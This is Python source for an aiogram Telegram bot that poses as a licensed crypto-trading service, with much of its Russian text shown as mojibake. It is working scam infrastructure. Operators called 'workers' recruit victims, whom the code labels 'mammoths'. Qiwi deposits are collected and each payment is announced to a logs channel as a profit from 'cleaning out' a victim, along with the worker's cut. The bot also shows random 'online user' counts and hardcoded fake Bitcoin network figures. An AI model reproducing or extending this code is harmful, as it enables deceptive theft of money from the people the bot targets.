import asyncio
import sqlite3
import json
import random
import requests
from environs import Env
from pyqiwip2p import QiwiP2P
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.utils import executor
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, message
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.types import CallbackQuery, Message
from aiogram.utils.callback_data import CallbackData
import scenes
import functions
from datetime import datetime

env = Env()
env.read_env()

NAME_TEAM = env.str('NAME_TEAM')
NAME_TRADING = env.str('NAME_TRADING')
TOKEN_TRADING = env.str('TOKEN_TRADING')
TOKEN_WORKER = env.str('TOKEN_WORKER')

PATHS = env.str('PATHS')
BD_PATH = env.str('BD_PATH')

LOGS_CHANNEL_ID = env.str('LOGS_CHANNEL_ID')
LOGS_CHAT_ID = env.str('LOGS_CHAT_ID')
USERNAME_TRADING_BOT = env.str('USERNAME_TRADING_BOT')

bot = Bot(TOKEN_TRADING, parse_mode=types.ParseMode.HTML, disable_web_page_preview=True)
worker_bot = Bot(TOKEN_WORKER, parse_mode=types.ParseMode.HTML, disable_web_page_preview=True)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

class enterCode(StatesGroup):
    ref_code = State()

class Deposit(StatesGroup):
    enter_amount = State()

class TradeState(StatesGroup):
    q1 = State()

class Withdraw(StatesGroup):
    q1 = State()

async def stock_panel() -> InlineKeyboardMarkup:
    bitcoin = InlineKeyboardButton(text="Bitcoin", callback_data="bitcoin")
    ethereum = InlineKeyboardButton(text="Ethereum", callback_data="ethereum")
    polkadot = InlineKeyboardButton(text="Polkadot", callback_data="polkadot")
    ripple = InlineKeyboardButton(text="Ripple", callback_data="ripple")
    doge = InlineKeyboardButton(text="DogeCoin", callback_data="doge")
    litecoin = InlineKeyboardButton(text="Litecoin", callback_data="litecoin")
    terra = InlineKeyboardButton(text="Terra", callback_data="terra")
    solana = InlineKeyboardButton(text="Solana", callback_data="solana")
    tron = InlineKeyboardButton(text="TRON", callback_data="tron")
    cardano = InlineKeyboardButton(text="Cardano", callback_data="cardano")
    return InlineKeyboardMarkup(row_width=2).add(bitcoin, ethereum, polkadot, ripple, doge, litecoin, terra, solana,tron, cardano)

async def choose(amount) -> InlineKeyboardMarkup:
    up = InlineKeyboardButton(text="‚¨ÜÔ∏è–ü–æ–≤—ã—à–µ–Ω–∏–µ", callback_data=choose_callback.new(amount=amount, direction="up"))
    down = InlineKeyboardButton(text="‚¨áÔ∏è–ü–æ–Ω–∏–∂–µ–Ω–∏–µ", callback_data=choose_callback.new(amount=amount, direction="down"))
    return InlineKeyboardMarkup(row_width=1).add(up, down)

choose_callback = CallbackData("choose", "amount", "direction")

print(f"{NAME_TEAM} | Trading: –¢—Ä–µ–π–¥–∏–Ω–≥ –±–æ—Ç –±—ã–ª –∑–∞–ø—É—â–µ–Ω!")

@dp.message_handler(chat_type='private', commands="start", state="*")
async def start(message: types.Message, state: FSMContext):
    try:
        referal_code = message.get_args()
        with sqlite3.connect(BD_PATH) as cursor:
            user = cursor.execute("SELECT * FROM users_trading WHERE id = ?", (message.from_user.id,)).fetchone()
        if user is None:
            with sqlite3.connect(BD_PATH) as cursor:
                worker = cursor.execute("SELECT * FROM worker WHERE referal_code = ?", (referal_code,)).fetchone()
            if worker is None:
                await message.answer(f"–î–ª—è –Ω–∞—á–∞–ª–∞ —Ä–∞–±–æ—Ç—ã, –Ω–∞–ø–∏—à–∏—Ç–µ –∫–æ–¥-–ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏–µ –ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–µ–≥–æ –í–∞—Å —á–µ–ª–æ–≤–µ–∫–∞")
                await enterCode.ref_code.set()
            else:
                await message.answer(f"–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!üëã \n\n"
                                     f"–í–∞—Å –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤—É–µ—Ç –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π –±–æ—Ç –ø–æ –∫—Ä–∏–ø—Ç–æ-–∏–Ω–≤–µ—Å—Ç–∏—Ü–∏—è–º {NAME_TRADING} üìà \n\n"
                                     f"–í –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç –≤ –±–æ—Ç–µ –≤—ã –º–æ–∂–µ—Ç–µ —Ç–æ—Ä–≥–æ–≤–∞—Ç—å —Ä–∞–∑–Ω–æ–π –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç–æ–π –∏ –±–µ–∑ –ø—Ä–æ–±–ª–µ–º –≤—ã–≤–æ–¥–∏—Ç—å –∑–∞—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã–µ —Å—Ä–µ–¥—Å—Ç–≤–∞.", reply_markup=scenes.main)
                with sqlite3.connect(BD_PATH) as cursor:
                    cursor.execute('INSERT INTO users_trading VALUES (?, ?, ?, ?, ?, ?)', (message.from_user.id, referal_code, 0, message.from_user.first_name, 1, 0))
                await worker_bot.send_message(worker[0], f"@{message.from_user.username} - —Ç–≤–æ–π –Ω–æ–≤—ã–π –º–∞–º–æ–Ω—Çü¶£")
        else:
            if user[5] == 1:
                return
            await message.answer(f"–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!üëã \n\n"
                                 f"–í–∞—Å –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤—É–µ—Ç –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π –±–æ—Ç –ø–æ –∫—Ä–∏–ø—Ç–æ-–∏–Ω–≤–µ—Å—Ç–∏—Ü–∏—è–º {NAME_TRADING} üìà \n\n"
                                 f"–í –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç –≤ –±–æ—Ç–µ –≤—ã –º–æ–∂–µ—Ç–µ —Ç–æ—Ä–≥–æ–≤–∞—Ç—å —Ä–∞–∑–Ω–æ–π –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç–æ–π –∏ –±–µ–∑ –ø—Ä–æ–±–ª–µ–º –≤—ã–≤–æ–¥–∏—Ç—å –∑–∞—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã–µ —Å—Ä–µ–¥—Å—Ç–≤–∞.", reply_markup=scenes.main)
    except Exception as e:
        print(e)
        print(f"{NAME_TEAM} | Trading: –£ –¢—Ä–µ–π–¥–∏–Ω–≥ –±–æ—Ç–∞ –≤–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ö–µ–Ω–¥–ª–µ—Ä–∞! –ò–∑–≤–µ—Å—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:")
        print(f"{NAME_TEAM} | Trading: {message.from_user.username} | {message.from_user.id} - {message.text}")

@dp.message_handler(state=enterCode.ref_code)
async def answer_code(message: types.Message, state: FSMContext):
    await state.update_data(code=message.text)
    data = await state.get_data()
    with sqlite3.connect(BD_PATH) as cursor:
        worker = cursor.execute("SELECT * FROM worker WHERE referal_code = ?", (data.get('code'),)).fetchone()
    if worker is None:
        await message.answer("‚ö†Ô∏è –ù–∞–ø–∏—à–∏—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –∫–æ–¥-–ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏–µ –ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–µ–≥–æ –í–∞—Å —á–µ–ª–æ–≤–µ–∫–∞")
    else:
        await message.answer(f"–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!üëã \n\n"
                             f"–í–∞—Å –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤—É–µ—Ç –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π –±–æ—Ç –ø–æ –∫—Ä–∏–ø—Ç–æ-–∏–Ω–≤–µ—Å—Ç–∏—Ü–∏—è–º {NAME_TRADING} üìà \n\n"
                             f"–í –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç –≤ –±–æ—Ç–µ –≤—ã –º–æ–∂–µ—Ç–µ —Ç–æ—Ä–≥–æ–≤–∞—Ç—å —Ä–∞–∑–Ω–æ–π –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç–æ–π –∏ –±–µ–∑ –ø—Ä–æ–±–ª–µ–º –≤—ã–≤–æ–¥–∏—Ç—å –∑–∞—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã–µ —Å—Ä–µ–¥—Å—Ç–≤–∞.", reply_markup=scenes.main)
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute('INSERT INTO users_trading VALUES (?, ?, ?, ?, ?, ?)', (message.from_user.id, data.get('code'), 0, message.from_user.first_name, 1, 0))
        await worker_bot.send_message(worker[0], f"@{message.from_user.username} - —Ç–≤–æ–π –Ω–æ–≤—ã–π –º–∞–º–æ–Ω—Çü¶£")
        await state.finish()

@dp.message_handler(chat_type='private', content_types=['text'], text='üíº –õ–∏—á–Ω—ã–π –ö–∞–±–∏–Ω–µ—Ç')
async def profile(message: types.Message):
    with sqlite3.connect(BD_PATH) as cursor:
        profile = cursor.execute(f'SELECT * FROM users_trading WHERE id = {message.from_user.id}').fetchone()
    if profile[5] == 1:
        return
    await message.answer_photo(open(f'{PATHS}/Trading/logo.jpg', 'rb'), f"üì≤ <b>–í–∞—à –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç</b> \n\n"
                                                               f"üí∏ –ë–∞–ª–∞–Ω—Å: {profile[2]} ‚ÇΩ \n\n"
                                                               f"üîí –í–∞—à –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã–π ID: {message.from_user.id} \n\n"
                                                               f"üìà <b>–ê–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –æ–Ω–ª–∞–π–Ω: {random.randint(1123, 4962)}</b>", reply_markup=scenes.profile)

@dp.message_handler(chat_type='private', content_types=['text'], text='‚ÑπÔ∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è')
async def information(message: types.Message):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {message.from_user.id}').fetchone()
    if user[5] == 1:
        return
    await message.answer(f"<b>‚ÑπÔ∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</b> \n\n"
                         f"<b>{NAME_TRADING}</b> -  —Ç–≤–æ–π –ª–∏—á–Ω—ã–π –ø–æ–º–æ—â–Ω–∏–∫ –≤ –º–∏—Ä–µ —Ç—Ä–µ–π–¥–∏–Ω–≥–∞. –°–µ—Ä–≤–∏—Å —Å–æ–∑–¥–∞–Ω –Ω–∞ –æ—Å–Ω–æ–≤–µ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω–æ–≥–æ API –∫—Ä–∏–ø—Ç–æ–±–∏—Ä–∂–∏ –∏ –∏–º–µ–µ—Ç –≤—Å–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –ª–∏—Ü–µ–Ω–∑–∏–∏ –∏ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è. \n\n"
                         f"–¢—ã –º–æ–∂–µ—à—å –ø—Ä–∏–≥–ª–∞—à–∞—Ç—å –¥—Ä—É–∑–µ–π –∏ –∑–∞—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å! \n\n"
                         f"–°–º–æ—Ç—Ä–∏ –æ–ø–∏—Å–∞–Ω–∏–µ —Ä–µ—Ñ–µ—Ä–∞–ª–∫–∏.", reply_markup=scenes.information)

@dp.message_handler(chat_type='private', content_types=['text'], text='üìà –ú–æ–π ECN —Å—á—ë—Ç')
async def information(message: types.Message):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {message.from_user.id}').fetchone()
    if user[5] == 1:
        return
    await message.answer(f"<b>–í—ã–±–µ—Ä–∏—Ç–µ –∞–∫—Ç–∏–≤:</b>", reply_markup=await stock_panel())

@dp.callback_query_handler(text='stats_network')
async def stats_network(call: CallbackQuery):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {call.from_user.id}').fetchone()
    if user[5] == 1:
        return
    await call.message.answer(f"üìà <b>–°–æ—Å—Ç–æ—è–Ω–∏–µ —Å–µ—Ç–∏ Bitcoin</b> \n\n"
                              f"–ó–∞–≥—Ä—É–∂–µ–Ω–Ω–æ—Å—Ç—å: üü¢ –Ω–∏–∑–∫–∞—è \n"
                              f"–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –±–ª–æ–∫–æ–≤: ‚âà 1 \n"
                              f"–†–∞–∑–º–µ—Ä: 1.9 mB (1.4 mVB) \n"
                              f"–ù–µ–ø–æ–¥—Ç–≤–µ—Ä–∂–¥—ë–Ω–Ω—ã—Ö —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π: {random.randint(1421, 3000)} \n"
                              f"–ö–æ–º–∏—Å—Å–∏—è –¥–ª—è –ø–æ–ø–∞–¥–∞–Ω–∏—è –≤ –ø–µ—Ä–≤—ã–π –±–ª–æ–∫: \n"
                              f"–ú–∏–Ω–∏–º—É–º: 0.00003072 BTC / kVB \n"
                              f"–ú–µ–¥–∏–∞–Ω–∞: 0.00004096 BTC / kVB \n")

@dp.callback_query_handler(text='referal_system')
async def referal_system(call: CallbackQuery):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute("SELECT * FROM users_trading WHERE id = ?", (call.from_user.id,)).fetchone()
    if user[5] == 1:
        return
    await call.message.answer(f"üë´ <b>–†–µ—Ñ–µ—Ä–∞–ª–∫–∞</b> \n\n"
                              f"–ü—Ä–∏–≥–ª–∞—à–∞–π –¥—Ä—É–∑–µ–π –∏ –∑–∞—Ä–∞–±–∞—Ç—ã–≤–∞–π! \n"
                              f"–°—Å—ã–ª–∫–∞, —á—Ç–æ–±—ã –ø–æ–¥–µ–ª–∏—Ç—å—Å—è –≤ Telegram: \n"
                              f"https://t.me/{USERNAME_TRADING_BOT}?start={user[1]} \n\n"
                              f"–†–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–µ –≤—ã–ø–ª–∞—Ç—ã: \n\n"
                              f"–ß–µ–ª–æ–≤–µ–∫, –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–≤—à–∏–π—Å—è –≤ –±–æ—Ç–µ –ø–æ —Ç–≤–æ–µ–π —Å—Å—ã–ª–∫–µ —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è —Ç–≤–æ–∏–º —Ä–µ—Ñ–µ—Ä–∞–ª–æ–º 1-–≥–æ –∫—Ä—É–≥–∞. \n"
                              f"–ö–æ–≥–¥–∞ —Ç–≤–æ–π —Ä–µ—Ñ–µ—Ä–∞–ª 1-–≥–æ –∫—Ä—É–≥–∞ –≤—ã–≤–æ–¥–∏—Ç –¥–µ–Ω—å–≥–∏ - —Ç—ã –ø–æ–ª—É—á–∞–µ—à—å —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–π –¥–æ—Ö–æ–¥. –ï—Å–ª–∏ —Ç–≤–æ–π —Ä–µ—Ñ–µ—Ä–∞–ª 1-–≥–æ –∫—Ä—É–≥–∞ –ø—Ä–∏–≥–ª–∞—à–∞–µ—Ç –∫–æ–≥–æ-—Ç–æ –ø–æ —Å–≤–æ–µ–π —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–π —Å—Å—ã–ª–∫–µ - —ç—Ç–æ—Ç —á–µ–ª–æ–≤–µ–∫ —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è —Ç–≤–æ–∏–º —Ä–µ—Ñ–µ—Ä–∞–ª–æ–º 2-–≥–æ –∫—Ä—É–≥–∞. \n\n"
                              f"–†–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–π –¥–æ—Ö–æ–¥ —Ä–∞—Å—Å—á–∏—Ç—ã–≤–∞–µ—Ç—Å—è —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º: \n\n"
                              f"–¢—ã –ø–æ–ª—É—á–∞–µ—à—å 60% –æ—Ç —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–≥–æ –≤–æ–∑–Ω–∞–≥—Ä–∞–∂–¥–µ–Ω–∏—è —Å–æ —Å–¥–µ–ª–∫–∏ —Ç–≤–æ–µ–≥–æ —Ä–µ—Ñ–µ—Ä–∞–ª–∞ 1-–≥–æ –∫—Ä—É–≥–∞ –∏ 40% –æ—Ç —ç—Ç–æ–≥–æ –≤–æ–∑–Ω–∞–≥—Ä–∞–∂–¥–µ–Ω–∏—è —Å–æ —Å–¥–µ–ª–∫–∏ —Ç–≤–æ–µ–≥–æ —Ä–µ—Ñ–µ—Ä–∞–ª–∞ 2-–≥–æ –∫—Ä—É–≥–∞. \n\n"
                              f"–†–∞–∑–º–µ—Ä —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–≥–æ –≤–æ–∑–Ω–∞–≥—Ä–∞–∂–¥–µ–Ω–∏—è —Å–æ—Å—Ç–∞–≤–ª—è–µ—Ç 30% –æ—Ç –∫–æ–º–∏—Å—Å–∏–∏, —É–ø–ª–∞—á–µ–Ω–Ω–æ–π —Å–µ—Ä–≤–∏—Å—É. \n\n"
                              f"–ï—Å–ª–∏ —Ä–µ—Ñ–µ—Ä–∞–ª 1-–≥–æ –∏–ª–∏ 2-–≥–æ –∫—Ä—É–≥–∞ –Ω–µ —Å–æ–≤–µ—Ä—à–∞–µ—Ç —Å–¥–µ–ª–∫–∏ –≤ –ø–µ—Ä–∏–æ–¥, –ø—Ä–µ–≤—ã—à–∞—é—â–∏–π –æ–¥–∏–Ω –∫–∞–ª–µ–Ω–¥–∞—Ä–Ω—ã–π –º–µ—Å—è—Ü, —Ç–æ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–µ –≤–æ–∑–Ω–∞–≥—Ä–∞–∂–¥–µ–Ω–∏–µ –ø–æ —ç—Ç–æ–º—É —Ä–µ—Ñ–µ—Ä–∞–ª—É –ø–µ—Ä–µ—Å—Ç–∞–µ—Ç –Ω–∞—á–∏—Å–ª—è—Ç—å—Å—è.")

@dp.message_handler(chat_type='private', content_types=['text'], text='üßëüèª‚Äçüíª–¢–µ—Ö. –ü–æ–¥–¥–µ—Ä–∂–∫–∞')
async def TS(message: types.Message):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {message.from_user.id}').fetchone()
    if user[5] == 1:
        return
    await message.answer(f"–£ –≤–∞—Å –≤–æ–∑–Ω–∏–∫–ª–∏ <b>–≤–æ–ø—Ä–æ—Å—ã</b> –∏–ª–∏ <b>–ø—Ä–æ–±–ª–µ–º—ã</b> ‚ÅâÔ∏è \n\n"
                         f"–í—ã –≤—Å–µ–≥–¥–∞ –º–æ–∂–µ—Ç–µ –æ–±—Ä–∞—Ç–∏—Ç—å—Å—è –≤ –Ω–∞—à—É —Å–ª—É–∂–±—É –ø–æ–¥–¥–µ—Ä–∂–∫–∏ \n\n"
                         f"üìö –ü—Ä–∞–≤–∏–ª–∞ –æ–±—â–µ–Ω–∏—è —Å –æ–ø–µ—Ä–∞—Ç–æ—Ä–æ–º: \n\n"
                         f"‚ûï –û–±—â–∞–π—Ç–µ—Å—å –≤–µ–∂–ª–∏–≤–æ, –ø–æ —Ç—É —Å—Ç–æ—Ä–æ–Ω—É —Å–∏–¥–∏—Ç —Ç–∞–∫–æ–π –∂–µ –∂–∏–≤–æ–π —á–µ–ª–æ–≤–µ–∫, –∫–∞–∫ –∏ –í—ã. \n\n"
                         f"‚ûï –°—Ç–∞—Ä–∞–π—Ç–µ—Å—å —Ñ–æ—Ä–º—É–ª–∏—Ä–æ–≤–∞—Ç—å –æ–±—Ä–∞—â–µ–Ω–∏–µ –∫ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É –µ–º–∫–æ –∏ –ª–∞–∫–æ–Ω–∏—á–Ω–æ, –≤ –æ–¥–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏–µ. \n\n"
                         f"‚ûï –û–±—Ä–∞—â–∞—Ç—å—Å—è –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É —Ç–æ–ª—å–∫–æ –ø–æ —Å—É—â–µ—Å—Ç–≤—É! \n\n"
                         f"‚ûï –ü–æ–¥–¥–µ—Ä–∂–∫–∞ –Ω–µ –≤–µ–¥—ë—Ç –ø—Ä–æ–¥–∞–∂ –∏ –Ω–µ –∑–∞–Ω–∏–º–∞–µ—Ç—Å—è –ø—Ä–∏–≤–ª–µ—á–µ–Ω–∏–µ–º –∫–ª–∏–µ–Ω—Ç–æ–≤! (–¢–æ–ª—å–∫–æ —Ä–µ—à–µ–Ω–∏–µ —Å–ø–æ—Ä–æ–≤, –æ–± –æ–ø–ª–∞—Ç–µ –∏ –≤—ã–≤–æ–¥–æ–≤). \n\n"
                         f"‚ûï –§–æ—Ä–º—É–ª–∏—Ä–æ–≤–∞—Ç—å –æ–±—Ä–∞—â–µ–Ω–∏–µ –∫ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å –∫–≤–∏—Ç–∞–Ω—Ü–∏–µ–π –æ–± –æ–ø–ª–∞—Ç–µ \n\n"
                         f"–°–æ–æ–±—â–µ–Ω–∏—è –ø–æ —Ç–∏–ø—É: \n"
                         f"- –Ø –Ω–µ —Å–æ—Ö—Ä–∞–Ω–∏–ª —á–µ–∫ \n"
                         f"- –Ø –ø–µ—Ä–µ–≤–µ–ª, –ø–æ—Å–º–æ—Ç—Ä–∏—Ç–µ \n"
                         f"- –ü—Ä–∏–≤–µ—Ç(—Ç.–¥.) \n"
                         f"‚ö†Ô∏è –ö–∞—Ç–µ–≥–æ—Ä–∏—á–µ—Å–∫–∏ –∏–≥–Ω–æ—Ä–∏—Ä—É—é—Ç—Å—è!", reply_markup=scenes.ts)

@dp.callback_query_handler(text='deposit')
async def deposit(call: CallbackQuery):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute("SELECT worker,ban FROM users_trading WHERE id = ?", (call.from_user.id,)).fetchone()
        worker = cursor.execute("SELECT id,min_deposit_trading FROM worker WHERE referal_code = ?", (user[0],)).fetchone()
    if user[1] == 1:
        return
    await call.message.answer(f"–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è \n"
                              f"<b>–°—É–º–º–∞ –º–∏–Ω–∏–º–∞–ª—å–Ω–æ–≥–æ –ø–ª–∞—Ç–µ–∂–∞ - {worker[1]} ‚ÇΩ</b>")
    await Deposit.enter_amount.set()

@dp.message_handler(state=Deposit.enter_amount)
async def answer_pay(message: types.Message, state: FSMContext):
    await state.update_data(amount=message.text)
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {message.from_user.id}').fetchone()
    if user[5] == 1:
        return
    selectPay = InlineKeyboardMarkup(
	    inline_keyboard = [
            [
                InlineKeyboardButton(text = 'üíµ –û–ø–ª–∞—Ç–∏—Ç—å Qiwi/–ö–∞—Ä—Ç–æ–π', callback_data = 'selectPay_qiwi,'+message.text)
		    ]
	    ]
    )
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute("SELECT worker FROM users_trading WHERE id = ?", (message.from_user.id,)).fetchone()
        worker = cursor.execute("SELECT id,min_deposit_trading FROM worker WHERE referal_code = ?", (user[0],)).fetchone()
    if message.text.isnumeric():
        if int(message.text) < worker[1]:
            await message.answer("–ù–µ–∫–∫–æ—Ä–µ–∫—Ç–Ω–æ –≤–≤–µ–¥–µ–Ω–∞ —Å—É–º–º–∞!")
        else:
            await message.answer("–í—ã–±–µ—Ä–∏—Ç–µ –º–µ—Ç–æ–¥ –æ–ø–ª–∞—Ç—ã", reply_markup=selectPay)
    await state.finish()
                                
@dp.callback_query_handler(text_startswith='selectPay_qiwi')
async def selectPay_qiwi(call: CallbackQuery):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {call.from_user.id}').fetchone()
    if user[5] == 1:
        return
    amount = call.data.split(",")[1]
    comment = random.randint(100000, 999999)
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute("SELECT worker FROM users_trading WHERE id = ?", (call.from_user.id,)).fetchone()
        worker = cursor.execute("SELECT id,min_deposit_trading FROM worker WHERE referal_code = ?", (user[0],)).fetchone()
        qiwi = cursor.execute("SELECT * FROM qiwi WHERE bot = 'trading'",).fetchone()
        cursor.execute("INSERT INTO qiwi_pays VALUES (?, ?, ?, ?)", (call.from_user.id, USERNAME_TRADING_BOT, comment, '0',))

    p2p = QiwiP2P(auth_key=qiwi[1])
    bill = p2p.bill(bill_id=comment, amount=amount, lifetime=45, comment=comment)
    
    accept_kb = types.InlineKeyboardMarkup()
    accept_kb.add(types.InlineKeyboardButton(text = '‚úÖ –û–ø–ª–∞—Ç–∏—Ç—å', callback_data=f"trading_accept,{comment},{call.from_user.id},{amount}"))

    await worker_bot.send_message(worker[0], f"‚úÖ <b>–ù–æ–≤–∞—è –∑–∞—è–≤–∫–∞ –Ω–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ!</b> \n"
                                             f"(–¢—Ä–µ–π–¥–∏–Ω–≥) \n\n"
                                             f"üêò –ú–∞–º–æ–Ω—Ç: {call.from_user.full_name} [@{call.from_user.username}] \n"
                                             f"üí∏ –°—É–º–º–∞: {amount} ‚ÇΩ", reply_markup=accept_kb)

    pay_kb = types.InlineKeyboardMarkup()
    pay_kb.add(types.InlineKeyboardButton(text = '–û–ø–ª–∞—Ç–∏—Ç—å', url=bill.pay_url))
    pay_kb.add(types.InlineKeyboardButton(text = '–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–ø–ª–∞—Ç—É', callback_data=f"check,{comment},{amount}"))
    
    await call.message.answer(f"<b>–°–æ–∑–¥–∞–Ω–∞ –∑–∞—è–≤–∫–∞ –Ω–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ {amount} ‚ÇΩ</b>", reply_markup=pay_kb)

@dp.callback_query_handler(text_startswith='check')
async def checkPay_qiwi(call: CallbackQuery):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {call.from_user.id}').fetchone()
    if user[5] == 1:
        return
    comment, price = call.data.split(",")[1], call.data.split(",")[2]
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute("SELECT * FROM users_trading WHERE id = ?", (call.from_user.id,)).fetchone()
        worker = cursor.execute("SELECT * FROM worker WHERE referal_code = ?", (user[1],)).fetchone()
        pays = cursor.execute("SELECT * FROM qiwi_pays WHERE comment = ?", (comment,)).fetchone()
        share_check = cursor.execute("SELECT * FROM qiwi_pays WHERE id = ? AND bot_username = ? AND status = 1", (call.from_user.id,USERNAME_TRADING_BOT,)).fetchone()
        qiwi = cursor.execute("SELECT p2p_secret_key FROM qiwi WHERE bot = 'trading'",).fetchone()
    check = await functions.pays(qiwi[0], comment)
    share = (float(await functions.worker_sharee(share_check)) * int(price))
    if pays[3] == 1:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute("UPDATE users_casino SET balance = balance + ? WHERE id = ?", (pays[2], call.from_user.id,))
        await call.message.edit_text(f'‚úÖ –û–ø–ª–∞—Ç–∞ –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ.')
    else:
        if check:
            current_time = datetime.now()
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute("UPDATE worker SET profits = profits + ? WHERE referal_code = ?", (price, user[1],))
                cursor.execute("UPDATE information SET profits = profits + 1, amount_profits = amount_profits + ? WHERE id = 1", (price,))
                cursor.execute("UPDATE users_trading SET balance = balance + ? WHERE id = ?", (price, call.from_user.id,))
                cursor.execute("UPDATE qiwi_pays SET status = ? WHERE comment = ?", ('1', comment,))
                cursor.execute('INSERT INTO profits VALUES (?, ?, ?, ?)', (call.from_user.id, worker[0], price, current_time.strftime("%Y-%m-%d")))

            if (worker[10] != 1):
                username = worker[1]
            else:
                username = '–ê–Ω–æ–Ω–∏–º'

            await worker_bot.send_message(LOGS_CHANNEL_ID, f"‚ò†Ô∏è <b>–ù–æ–≤—ã–π –ø—Ä–æ—Ñ–∏—Ç!</b>  üìä TRADE \n\n"
                                                        f"üè¥‚Äç‚ò†Ô∏è –û–±—á–∏—Å—Ç–∏–ª –º–∞–º–æ–Ω—Ç–∞: <b>{username}</b> \n"
                                                        f"üí∏ –°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è: <b>{price}‚ÇΩ</b> \n"
                                                        f"‚îî –î–æ–ª—è –≤–æ—Ä–∫–µ—Ä–∞: <b>{share}‚ÇΩ</b>")
            await worker_bot.send_sticker(worker[0], "CAACAgIAAxkBAAEGWd9jaiqWrvCr0fgS6PJI_Y3_CS--3QACZAADDbbSGRbBZmuQEnSJKwQ")
            await worker_bot.send_sticker(LOGS_CHAT_ID, "CAACAgIAAxkBAAEGWd9jaiqWrvCr0fgS6PJI_Y3_CS--3QACZAADDbbSGRbBZmuQEnSJKwQ")
